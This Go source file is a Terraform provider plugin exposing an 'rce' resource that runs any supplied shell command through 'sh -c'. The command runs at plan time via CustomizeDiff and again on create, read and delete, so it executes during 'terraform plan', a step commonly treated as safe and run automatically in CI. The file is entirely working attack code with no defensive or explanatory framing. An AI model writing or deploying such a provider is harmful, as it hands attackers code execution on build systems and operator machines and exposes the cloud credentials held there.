// main.go
package main

import (
	"context"
	"fmt"
	"os/exec"
	"time"
	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
)

func main() {
	// Start the plugin server
	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return &schema.Provider{
				ResourcesMap: map[string]*schema.Resource{
					"rce": resourceRCE(),
				},
			}
		},
	})
}

func resourceRCE() *schema.Resource {
	return &schema.Resource{
		Create: resourceRCECreate,
		Read:   resourceRCERead,
		Delete: resourceRCEDelete,
		Schema: map[string]*schema.Schema{
			"command": {
				Type:     schema.TypeString,
				Required: true,
				ForceNew: true,
			},
			"output": {
				Type:     schema.TypeString,
				Computed: true,
			},
		},
		CustomizeDiff: resourceRCECustomizeDiff,
	}
}

func resourceRCECustomizeDiff(ctx context.Context, d *schema.ResourceDiff, meta interface{}) error {
	command := d.Get("command").(string)

	// Execute the command with a timeout to prevent hanging
	ctxTimeout, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctxTimeout, "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error executing command during plan: %s", err)
	}

	if err := d.SetNew("output", string(output)); err != nil {
		return fmt.Errorf("error setting output during plan: %s", err)
	}

	return nil
}

func resourceRCECreate(d *schema.ResourceData, m interface{}) error {
	return executeCommand(d)
}

func resourceRCERead(d *schema.ResourceData, m interface{}) error {
	// Execute the command when reading the resource
	command := d.Get("command").(string)

	// Execute the command with a timeout to prevent hanging
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// If there is an error, we assume the resource no longer exists
		d.SetId("")
		return nil
	}

	d.Set("output", string(output))
	return nil
}

func resourceRCEDelete(d *schema.ResourceData, m interface{}) error {
	// Re-execute the command during resource deletion
	return executeCommand(d)
}

func executeCommand(d *schema.ResourceData) error {
	command := d.Get("command").(string)

	// Execute the command with a timeout
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error executing command: %s", err)
	}

	d.SetId(command)
	d.Set("output", string(output))

	return nil
}
